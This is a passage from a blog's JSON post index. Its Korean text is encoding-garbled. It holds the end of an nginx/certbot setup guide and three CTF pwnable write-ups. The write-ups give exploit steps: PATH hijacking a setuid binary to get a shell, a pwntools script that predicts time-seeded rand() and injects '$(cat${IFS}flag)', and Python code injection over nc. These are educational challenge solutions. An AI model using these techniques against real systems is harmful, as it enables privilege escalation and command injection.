í•´ì£¼ì…¨ë‹¤.      entrypoint : ì¸ì¦ì„œ ê°±ì‹ ìš©      2. data/nginx.conf ì‘ì„±í•˜ê¸°docker-compose.yml ì‘ì„±ì„ ì™„ë£Œí–ˆìœ¼ë©´ ê°™ì€ ë””ë ‰í† ë¦¬ì— data/ ë””ë ‰í† ë¦¬ë¥¼ ìƒì„±í•˜ê³  ê·¸ ì•ˆì— nginx.conf ë¥¼ ì‘ì„±í•œë‹¤. ê¸°ë³¸ í‹€ì€ ì•„ë˜ì™€ ê°™ì€ë°, ì£¼ì„ìœ¼ë¡œ í‘œì‹œí•œ ë¶€ë¶„ì„ ë³¸ì¸ì— ë§ê²Œ ë³€ê²½í•˜ë„ë¡ í•˜ì(ë„ë©”ì¸ ë° proxy alias)ì—¬ê¸°ì„œ 29ë²ˆ ë¼ì¸ì— URLì—ëŠ” docker-compose.yml ì— ì‘ì„±í•œ ë³¸ì¸ì˜ ì• í”Œë¦¬ì¼€ì´ì…˜ container nameì„ ì ì–´ì£¼ë©´ ëœë‹¤. (ì˜ˆì‹œëŠ” your-application)worker_processes auto;error_log /var/log/nginx/error.log warn;pid /var/run/nginx.pid;events {\tworker_connections 1024;}http {\tinclude mime.types;\tserver {\t\tlisten 80;\t\tserver_name your.domain.com; # modify required!!!\t\tlocation /.well-known/acme-challenge/ {\t\t\troot /var/www/certbot;\t\t}\t\tlocation / {\t\t\treturn 301 https://$host$request_uri;\t\t}    \t}\tserver {\t\tlisten 443 ssl;\t\tserver_name your.domain.com; # modify required!!!\t\t\t\tlocation / {\t\t\tproxy_pass http://your-application:8080/; # modify required!!! &amp; check your application port\t\t}\t\tssl_certificate /etc/letsencrypt/live/your.domain.com/fullchain.pem; # modify required!!!\t\tssl_certificate_key /etc/letsencrypt/your.domain.com/privkey.pem; # modify required!!!\t\tinclude /etc/letsencrypt/options-ssl-nginx.conf;\t\tssl_dhparam /etc/letsencrypt/ssl-dhparams.pem;\t}\tlog_format main '$remote_addr - $remote_user [$time_local] \"$request\" '\t'$status $body_bytes_sent \"$http_referer\" '\t'\"$http_user_agent\" \"$http_x_forwarded_for\"';\taccess_log /var/log/nginx/access.log main;\tsendfile on;\tkeepalive_timeout 65;}3. init-letsencrypt.shì„œë²„ êµ¬ì„±ì— í•„ìš”í•œ íŒŒì¼ë“¤ì€ ëª¨ë‘ ì‘ì„±í–ˆë‹¤. ë§ˆì§€ë§‰ìœ¼ë¡œ, ì„œë²„ì— ssl ì¸ì¦ì„ ë„£ì–´ì¤˜ì•¼ í•˜ëŠ”ë° ì›ë˜ëŒ€ë¡œë¼ë©´ êµ‰ì¥íˆ ë…¸ê°€ë‹¤ë¥¼ í•´ì•¼í•œë‹¤.ê·¸ëŸ°ë° ê°ì‚¬í•˜ê²Œë„ ëˆ„êµ°ê°€ ì•„ë˜ì™€ ê°™ì€ nginx ssl ì¸ì¦ ìŠ¤í¬ë¦½íŠ¸ë¥¼ ì‘ì„±í•´ë†“ì•˜ë‹¤. ê°ì‚¬í•œ ë§ˆìŒìœ¼ë¡œ pull í•´ì„œ ì“°ë„ë¡ í•˜ì.curl -L https://raw.githubusercontent.com/wmnnd/nginx-certbot/master/init-letsencrypt.sh &gt; init-letsencrypt.shì´ì œ init-letsencrypt.sh ë¥¼ ì‹¤í–‰ì‹œí‚¤ê¸°ë§Œ í•˜ë©´ ë˜ëŠ”ë° ê·¸ ì „ì— ëª‡ê°€ì§€ ìˆ˜ì •í•´ì¤˜ì•¼ í•˜ëŠ” ê²ƒì´ ìˆë‹¤.#!/bin/bashif ! [ -x \"$(command -v docker-compose)\" ]; then  echo 'Error: docker-compose is not installed.' &gt;&amp;2  exit 1fidomains=(domain.com, www.domain.com) # ì—¬ê¸° ë„ë©”ì¸ ë³€ê²½!!rsa_key_size=4096data_path=\"./data/certbot\"email=\"\" # ì—¬ê¸° ì´ë©”ì¼ ë„£ê¸°!!staging=0 # í…ŒìŠ¤íŠ¸í•  ë•ŒëŠ” ì—¬ê¸° 1ë¡œ ë°”ê¾¸ê¸°!! release ì‹œì—ëŠ” ë‹¤ì‹œ 0ìœ¼ë¡œ ë³€ê²½# ... í›„ëµ ...  L8 : ë³¸ì¸ì˜ ë„ë©”ì¸ìœ¼ë¡œ ë³€ê²½í•´ì£¼ì.  L11 : ë³¸ì¸ì˜ ì´ë©”ì¼ì„ ë„£ì–´ì£¼ì.  L12 : í…ŒìŠ¤íŠ¸ í•  ë•ŒëŠ” staging í”Œë˜ê·¸ë¥¼ 1ë¡œ ë°”ê¿”ì„œ ëŒë ¤ì•¼ í•œë‹¤. ì´ê±° ì„¤ì • ì•ˆí•˜ë©´ letsencryptì— ssl ì¸ì¦ ìš”ì²­í•˜ëŠ” íšŸìˆ˜ê°€ ì œí•œë˜ì–´ ìˆì–´ì„œ blockë  ìˆ˜ë„ ìˆë‹¤.4. ssl ì¸ì¦ ë°›ê¸°ëª¨ë“  ì¤€ë¹„ê°€ ë‹¤ ë˜ì—ˆìœ¼ë©´ sudo ë¡œ ìŠ¤í¬ë¦½íŠ¸ë¥¼ ì‹¤í–‰í•´ì£¼ì.sudo ./init-letsencrypt.shì¤‘ê°„ì— Y/N ì§ˆì˜ê°€ ìˆëŠ”ë° Y ì„ íƒí•˜ê³  ì—”í„° ì³ì£¼ë©´ì„±ê³µ!! í•œê²ƒì„ ë³¼ ìˆ˜ ìˆë‹¤."
  },
  
  {
    "title": "[Dreamhack CTF Season 2 #11] Welcome writeup",
    "url": "/posts/dreamhack-welcome/",
    "categories": "CTF, PWNABLE",
    "tags": "ctf",
    "date": "2023-01-29 21:56:00 +0900",
    





    
    "snippet": "source codechal ë°”ì´ë„ˆë¦¬ì˜ ë‚´ìš©ì€ ì•„ë˜ì™€ ê°™ë‹¤.int __cdecl main(int argc, const char **argv, const char **envp){  __asm { endbr64 }  sub_1080(1001LL, 1001LL, 1001LL);  sub_1090(\"clear\");  sub_1070(\"Tada~!\");  re...",
    "content": "source codechal ë°”ì´ë„ˆë¦¬ì˜ ë‚´ìš©ì€ ì•„ë˜ì™€ ê°™ë‹¤.int __cdecl main(int argc, const char **argv, const char **envp){  __asm { endbr64 }  sub_1080(1001LL, 1001LL, 1001LL);  sub_1090(\"clear\");  sub_1070(\"Tada~!\");  return 0;}ë°”ì´ë„ˆë¦¬ë¥¼ ì‹¤í–‰í•˜ë©´ clearë¥¼ ì‹¤í–‰í•˜ê³  Tada~ ë¬¸ìì—´ì„ ì¶œë ¥í•œ ë’¤ ì¢…ë£Œí•œë‹¤. ì´ì œ remoteì— ì ‘ì†í•´ë³´ìpwn@localhost:~$ iduid=1000(pwn) gid=1000(pwn) groups=1000(pwn)pwn@localhost:~$ ls -altotal 48drwxr-x--- 1 pwn  pwn    4096 Dec  7 09:06 .drwxr-xr-x 1 root root   4096 Dec  5 04:32 ..-rw-r--r-- 1 pwn  pwn     220 Dec  5 04:32 .bash_logout-rw-r--r-- 1 pwn  pwn    3771 Dec  5 04:32 .bashrcdrwx------ 2 pwn  pwn    4096 Dec  7 09:06 .cache-rw-r--r-- 1 pwn  pwn     807 Dec  5 04:32 .profile-rwxr-sr-x 1 root pwned 16048 Dec  5 04:32 chal-rw-r-S--- 1 root pwned    69 Dec  5 04:32 flagpwn@localhost:~$flagì— readê°€ ë§‰í˜€ìˆìœ¼ë‚˜, chal ì— setuidê°€ ê±¸ë ¤ìˆë‹¤. ì´ë¥¼ í†µí•´ chalì´ í•˜ëŠ” í–‰ìœ„ë¥¼ ì¡°ì‘í•´ì•¼ í•˜ëŠ” ê²ƒì„ ì•Œ ìˆ˜ ìˆë‹¤.ì•ì„œ ë°”ì´ë„ˆë¦¬ë¥¼ ë³¸ëŒ€ë¡œ chalì€ system(\"clear\") ì™€ ê°™ì´ ì‹¤í–‰í•˜ë¯€ë¡œ bashì˜ í™˜ê²½ë³€ìˆ˜($PATH)ì˜ ì˜í–¥ì„ ë°›ëŠ”ë‹¤.ê·¸ëŸ¬ë¯€ë¡œ ì„ì˜ ê²½ë¡œì— bashë¥¼ ì‹¤í–‰í•´ì£¼ëŠ” ëª…ë ¹ì„ clearë¼ëŠ” ì´ë¦„ìœ¼ë¡œ ì €ì¥í•˜ê³ , í•´ë‹¹ ê²½ë¡œë¥¼ í™˜ê²½ë³€ìˆ˜ì— ì¶”ê°€í•´ì£¼ë©´ í”Œë˜ê·¸ë¥¼ ì½ì„ ìˆ˜ ìˆë‹¤.vulnerabilitypwn@localhost:~$ ./flag-bash: ./flag: Permission deniedpwn@localhost:~$pwn@localhost:~$ cd /tmp/pwn@localhost:/tmp$ echo \"/bin/bash\" &gt; clearpwn@localhost:/tmp$ chmod 777 clearpwn@localhost:/tmp$ cat clear/bin/bashpwn@localhost:/tmp$pwn@localhost:/tmp$ echo $PATH/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/binpwn@localhost:/tmp$ export PATH=/tmp:$PATHpwn@localhost:/tmp$ echo $PATH/tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/binpwn@localhost:/tmp$pwn@localhost:/tmp$ cd ~pwn@localhost:~$ ./chalpwn@localhost:~$ iduid=1000(pwn) gid=1001(pwned) groups=1001(pwned),1000(pwn)pwn@localhost:~$ cat flagDH{e47d874ddc629f916d3d5ef6f0d0de90c7b151f9d7010325d051c811382b489f}pwn@localhost:~$"
  },
  
  {
    "title": "[Dreamhack CTF Season 2 #11] Cat Jump writeup",
    "url": "/posts/dreamhack-cat-jump/",
    "categories": "CTF, PWNABLE",
    "tags": "ctf",
    "date": "2023-01-29 21:56:00 +0900",
    





    
    "snippet": "source codeì†ŒìŠ¤ì½”ë“œê°€ ì£¼ì–´ì§€ëŠ” ë¬¸ì œì´ë‹¤./* cat_jump.c * gcc -Wall -no-pie -fno-stack-protector cat_jump.c -o cat_jump*/#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;time.h&gt;#include &lt;unistd...",
    "content": "source codeì†ŒìŠ¤ì½”ë“œê°€ ì£¼ì–´ì§€ëŠ” ë¬¸ì œì´ë‹¤./* cat_jump.c * gcc -Wall -no-pie -fno-stack-protector cat_jump.c -o cat_jump*/#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;time.h&gt;#include &lt;unistd.h&gt;#define CAT_JUMP_GOAL 37#define CATNIP_PROBABILITY 0.1#define CATNIP_INVINCIBLE_TIMES 3#define OBSTACLE_PROBABILITY 0.5#define OBSTACLE_LEFT  0#define OBSTACLE_RIGHT 1void Init() {    setvbuf(stdin, 0, _IONBF, 0);    setvbuf(stdout, 0, _IONBF, 0);    setvbuf(stderr, 0, _IONBF, 0);}void PrintBanner() {    puts(\"                         .-.\\n\" \\         \"                          \\\\ \\\\\\n\" \\         \"                           \\\\ \\\\\\n\" \\         \"                            | |\\n\" \\         \"                            | |\\n\" \\         \"          /\\\\---/\\\\   _,---._ | |\\n\" \\         \"         /^   ^  \\\\,'       `. ;\\n\" \\         \"        ( O   O   )           ;\\n\" \\         \"         `.=o=__,'            \\\\\\n\" \\         \"           /         _,--.__   \\\\\\n\" \\         \"          /  _ )   ,'   `-. `-. \\\\\\n\" \\         \"         / ,' /  ,'        \\\\ \\\\ \\\\ \\\\\\n\" \\         \"        / /  / ,'          (,_)(,_)\\n\" \\         \"       (,;  (,,)      jrei\\n\");}char cmd_fmt[] = \"echo \\\"%s\\\" &gt; /tmp/cat_db\";void StartGame() {    char cat_name[32];    char catnip;    char cmd[64];    char input;    char obstacle;    double p;    unsigned char jump_cnt;    srand(time(NULL));    catnip = 0;    jump_cnt = 0;    puts(\"let the cat reach the roof! ğŸˆ\");    sleep(1);    do {        // set obstacle with a specific probability.        obstacle = rand() % 2;        // get input.        do {            printf(\"left jump='h', right jump='j': \");            scanf(\"%c%*c\", &amp;input);        } while (input != 'h' &amp;&amp; input != 'l');        // jump.        if (catnip) {            catnip--;            jump_cnt++;            puts(\"the cat powered up and is invincible! nothing cannot stop! ğŸˆ\");        } else if ((input == 'h' &amp;&amp; obstacle != OBSTACLE_LEFT) ||                (input == 'l' &amp;&amp; obstacle != OBSTACLE_RIGHT)) {            jump_cnt++;            puts(\"the cat jumped successfully! ğŸ±\");        } else {            puts(\"the cat got stuck by obstacle! ğŸ˜¿ ğŸª¨ \");            return;        }        // eat some catnip with a specific probability.        p = (double)rand() / RAND_MAX;        if (p &lt; CATNIP_PROBABILITY) {            puts(\"the cat found and ate some catnip! ğŸ˜½\");            catnip = CATNIP_INVINCIBLE_TIMES;        }    } while (jump_cnt &lt; CAT_JUMP_GOAL);    puts(\"your cat has reached the roof!\\n\");    printf(\"let people know your cat's name ğŸ˜¼: \");    scanf(\"%31s\", cat_name);    snprintf(cmd, sizeof(cmd), cmd_fmt, cat_name);    system(cmd);    printf(\"goodjob! \");    system(\"cat /tmp/cat_db\");}int main(void) {    Init();    PrintBanner();    StartGame();    return 0;}random ìœ¼ë¡œ ìƒì„±ë˜ëŠ” ê°’ì— ë”°ë¼ ìƒì„±ë˜ëŠ” ì™¼ìª½/ì˜¤ë¥¸ìª½ ì •ë‹µì„ 37íšŒ ë§ì¶”ë©´ command injectionì„ ìˆ˜í–‰í•  ìˆ˜ ìˆë‹¤.vulnerability// L42char cmd_fmt[] = \"echo \\\"%s\\\" &gt; /tmp/cat_db\";// L98    snprintf(cmd, sizeof(cmd), cmd_fmt, cat_name);    system(cmd);    printf(\"goodjob! \");    system(\"cat /tmp/cat_db\");ì´ì œ, ê³ ì–‘ì´ê°€ ì í”„í•˜ëŠ” ê²Œì„ì„ 37íšŒ ì´ê²¨ì•¼ í•˜ëŠ”ë°, ì •ë‹µì„ ìƒì„±í•˜ëŠ” ëœë¤ í•¨ìˆ˜ê°€ srand(time(NULL)) ë° rand() ì´ë‹¤.ì¦‰, ì •ë‹µì„ ë§Œë“œëŠ” í•¨ìˆ˜ì˜ ì‹œë“œê°€ ì‹œê°„ì´ê¸° ë•Œë¬¸ì— ì„œë²„ì— ì ‘ì†í•˜ëŠ” ë™ì‹œì— time seedë¥¼ ë§Œë“¤ì–´ë‚´ê³ , pythoon ctypesë¡œ rand()ë¥¼ í˜¸ì¶œí•´ì£¼ë©´ ì„œë²„ì™€ ë™ì¼í•œ ê²°ê³¼ ê°’ì„ íšë“í•  ìˆ˜ ìˆë‹¤.ë‹¤ë§Œ, ì—¬ê¸°ì„œ ì£¼ì˜í•´ì•¼í•  ì ì€ ë§Œì•½ srand(time(NULL)) ì— ì˜í•´ ê°’ì´ [1, 2, 3, 4, 5] ë¡œ ë§Œë“¤ì–´ì¡Œì„ ê²½ìš° ê°’ì„ í•˜ë‚˜ì”© iterate í•˜ì—¬ ì‚¬ìš©í•˜ëŠ”ë°(1, 2, 3, 4, 5, â€¦), ê³ ì–‘ì´ ì í”„ ê²Œì„ì—ì„œëŠ” í•œ ë£¨í”„ì— rand()ë¥¼ (1) ë‹µì„ ì…ë ¥ ë°›ê¸° ì „, (2) ë‹µì„ ì…ë ¥í•œ í›„ì— ìº£ë‹¢ì„ ì¤„ì§€ ë§ì§€ ê²°ì •í•˜ëŠ” ë£¨í‹´ ì´ ë‘ë²ˆ ìˆ˜í–‰í•œë‹¤.ë•Œë¬¸ì— exploití•  ë•Œ í•œ ë£¨í”„ì— rand() ê°€ ë‘ë²ˆ í˜¸ì¶œë  ìˆ˜ ìˆë„ë¡ ì‘ì„±í•´ì•¼ í•œë‹¤.solveí’€ì´ëŠ” ì•„ë˜ì™€ ê°™ë‹¤.from pwn import *from ctypes import *from ctypes.util import find_libraryimport base64import timep = remote('host3.dreamhack.games', 17969)# p = process('./deploy/cat_jump')c = CDLL(find_library('/lib/x86_64-linux-gnu/libc.so.6'))c.srand(c.time(0))obstacle = c.rand() % 2p.recvuntil(b\"left jump='h', right jump='j':\")if obstacle == 0:    p.sendline(bytes('l', 'utf-8'))elif obstacle == 1:    p.sendline(bytes('h', 'utf-8'))for i in range(36):    try:        recv = p.recvuntil(b\":\")        c.rand()        obstacle = c.rand() % 2        print(recv.decode('utf-8'))    except:        print()        p.interactive()    if(obstacle == 0):        p.sendline(bytes('l', 'utf-8'))    if(obstacle == 1):        p.sendline(bytes('h', 'utf-8'))recv = p.recvuntil(b\": \")print(recv)p.sendline(bytes('$(cat${IFS}flag)', 'utf-8'))p.interactive()command injeciton í•˜ëŠ” ë¶€ë¶„ì€ echoì— ë“¤ì–´ê°€ëŠ” ë¬¸ìì—´ì„ command substitution í•˜ì—¬ flagë¥¼ ì½ì„ ìˆ˜ ìˆë„ë¡ í•´ì£¼ì. ë¬¸ì œ ë°”ì´ë„ˆë¦¬ì—ì„œëŠ” í•´ë‹¹ ë¶€ë¶„ì— ë„ì–´ì“°ê¸°ë¥¼ í—ˆìš©í•˜ì§€ ì•Šìœ¼ë¯€ë¡œ ${IFS} ë¥¼ ì‚¬ìš©í•˜ëŠ” ë“± ì˜ ìš°íšŒí•´ë³´ì. the cat jumped successfully! ğŸ±left jump='h', right jump='j': the cat jumped successfully! ğŸ±left jump='h', right jump='j': the cat jumped successfully! ğŸ±left jump='h', right jump='j': the cat jumped successfully! ğŸ±left jump='h', right jump='j': the cat jumped successfully! ğŸ±the cat found and ate some catnip! ğŸ˜½left jump='h', right jump='j': the cat powered up and is invincible! nothing cannot stop! ğŸˆleft jump='h', right jump='j': the cat powered up and is invincible! nothing cannot stop! ğŸˆleft jump='h', right jump='j': the cat powered up and is invincible! nothing cannot stop! ğŸˆleft jump='h', right jump='j':your cat has reached the roof!let people know your cat's name ğŸ˜¼: [*] Switching to interactive modegoodjob! DH{da65478323e88390957aee8177eb3cf6e60a2a6b486a76d46fc4d94ec785bb48}[*] Got EOF while reading in interactive"
  },
  
  {
    "title": "[2021 HackPack CTF] baby calc writeup",
    "url": "/posts/baby-calc-writeup/",
    "categories": "CTF, PWNABLE",
    "tags": "ctf",
    "date": "2023-01-29 17:33:00 +0900",
    





    
    "snippet": "checksecRELRO           STACK CANARY      NX            PIE             Full RELRO      Canary found      NX enabled    PIE enabled ê¸°ëŠ¥ ë¶„ì„r99bbit@parkmin-dev:~/ctf$ ./chal Welcome to CloudAdd! The f...",
    "content": "checksecRELRO           STACK CANARY      NX            PIE             Full RELRO      Canary found      NX enabled    PIE enabled ê¸°ëŠ¥ ë¶„ì„r99bbit@parkmin-dev:~/ctf$ ./chal Welcome to CloudAdd! The fastest* adder on the planet, now in cloud!*this is not a legally binding statementVariable one: 1Variable two: 23  ì…ë ¥ ë°›ì€ ë‘ ìˆ˜ë¥¼ ë”í•´ì¤€ë‹¤.source codeint __cdecl main(int argc, const char **argv, const char **envp){  __int64 v3; // rbp  int result; // eax  __int64 v5; // rdx  unsigned __int64 v6; // rt1  char v7[55]; // [rsp+0h] [rbp-178h]  char v8[55]; // [rsp+40h] [rbp-138h]  char output_buff[220]; // [rsp+80h] [rbp-F8h]  unsigned __int64 v10; // [rsp+168h] [rbp-10h]  __int64 v11; // [rsp+170h] [rbp-8h]  __asm { endbr64 }  v11 = v3;  v10 = __readfsqword(0x28u);  sub_10F0(_bss_start, 0LL, 2LL, 0LL);  *(_QWORD *)v7 = 0LL;  *(_QWORD *)&amp;v7[8] = 0LL;  *(_QWORD *)&amp;v7[16] = 0LL;  *(_QWORD *)&amp;v7[24] = 0LL;  *(_QWORD *)&amp;v7[32] = 0LL;  *(_QWORD *)&amp;v7[40] = 0LL;  *(_DWORD *)&amp;v7[48] = 0;  *(_WORD *)&amp;v7[52] = 0;  v7[54] = 0;  *(_QWORD *)v8 = 0LL;  *(_QWORD *)&amp;v8[8] = 0LL;  *(_QWORD *)&amp;v8[16] = 0LL;  *(_QWORD *)&amp;v8[24] = 0LL;  *(_QWORD *)&amp;v8[32] = 0LL;  *(_QWORD *)&amp;v8[40] = 0LL;  *(_DWORD *)&amp;v8[48] = 0;  *(_WORD *)&amp;v8[52] = 0;  v8[54] = 0;  *(_QWORD *)output_buff = 0LL;  *(_QWORD *)&amp;output_buff[8] = 0LL;  *(_QWORD *)&amp;output_buff[16] = 0LL;  *(_QWORD *)&amp;output_buff[24] = 0LL;  *(_QWORD *)&amp;output_buff[32] = 0LL;  *(_QWORD *)&amp;output_buff[40] = 0LL;  *(_QWORD *)&amp;output_buff[48] = 0LL;  *(_QWORD *)&amp;output_buff[56] = 0LL;  *(_QWORD *)&amp;output_buff[64] = 0LL;  *(_QWORD *)&amp;output_buff[72] = 0LL;  *(_QWORD *)&amp;output_buff[80] = 0LL;  *(_QWORD *)&amp;output_buff[88] = 0LL;  *(_QWORD *)&amp;output_buff[96] = 0LL;  *(_QWORD *)&amp;output_buff[104] = 0LL;  *(_QWORD *)&amp;output_buff[112] = 0LL;  *(_QWORD *)&amp;output_buff[120] = 0LL;  *(_QWORD *)&amp;output_buff[128] = 0LL;  *(_QWORD *)&amp;output_buff[136] = 0LL;  *(_QWORD *)&amp;output_buff[144] = 0LL;  *(_QWORD *)&amp;output_buff[152] = 0LL;  *(_QWORD *)&amp;output_buff[160] = 0LL;  *(_QWORD *)&amp;output_buff[168] = 0LL;  *(_QWORD *)&amp;output_buff[176] = 0LL;  *(_QWORD *)&amp;output_buff[184] = 0LL;  *(_QWORD *)&amp;output_buff[192] = 0LL;  *(_QWORD *)&amp;output_buff[200] = 0LL;  *(_QWORD *)&amp;output_buff[208] = 0LL;  *(_DWORD *)&amp;output_buff[216] = 0;  sub_10E0(\"Variable one: \");  sub_1100(\"%55s\", v7);  sub_10E0(\"Variable two: \");  sub_1100(\"%55s\", v8);  sub_1110(output_buff, \"python3 -c 'print(%s + %s)'\", v7, v8);  sub_10D0(output_buff);  result = 0;  v6 = __readfsqword(0x28u);  v5 = v6 ^ v10;  if ( v6 != v10 )    result = sub_10C0(output_buff, \"python3 -c 'print(%s + %s)'\", v5);  return result;}  í•µì‹¬ì€ ë§ˆì§€ë§‰ ì¤„ì¸ë°, ì…ë ¥ ë°›ì€ ë‘ ìˆ˜ë¥¼ python ìŠ¤í¬ë¦½íŠ¸ë¡œ ì‹¤í–‰í•œë‹¤.  untrusted input ì— ëŒ€í•œ ì œëŒ€ë¡œ ëœ ê²€ì¦ì„ í•˜ì§€ ì•ŠëŠ”ë‹¤.  ë”°ë¼ì„œ í•´ë‹¹ ë¡œì§ì— command injection ì·¨ì•½ì ì´ ìˆìŒì„ ì•Œ ìˆ˜ ìˆë‹¤.vulnerabilityr99bbit@parkmin-dev:~/ctf$ ./chal Welcome to CloudAdd! The fastest* adder on the planet, now in cloud!*this is not a legally binding statementVariable one: );1Variable two: 2;print(0xdeadbeef3735928559r99bbit@parkmin-dev:~/ctf$  command injection ì·¨ì•½ì ì„ ì¦ëª…í•˜ê¸° ìœ„í•œ stdinì„ ì§‘ì–´ ë„£ì–´ ë´¤ë‹¤.  print();1+2;print(0xdeadbeef) í˜•íƒœë¡œ ì½”ë“œê°€ ì‹¤í–‰ë˜ì–´ ì½”ë“œê°€ ë³´ì´ëŠ” ê²ƒì„ ë³¼ ìˆ˜ ìˆë‹¤.solve  local exploitr99bbit@parkmin-dev:~/ctf$ ./chal Welcome to CloudAdd! The fastest* adder on the planet, now in cloud!*this is not a legally binding statementVariable one: );1Variable two: 2;print(open(\"./flag\",\"r\").read(){fake_flag}r99bbit@parkmin-dev:~/ctf$  remote exploitr99bbit@parkmin-dev:~/ctf$ nc ctf2021.hackpack.club 11001Welcome to CloudAdd! The fastest* adder on the planet, now in cloud!*this is not a legally binding statementVariable one: );1Variable two: 2;print(open(\"./flag\",\"r\").read()flag{cL0uD_5Tr4tEgy}"
  }
  
]

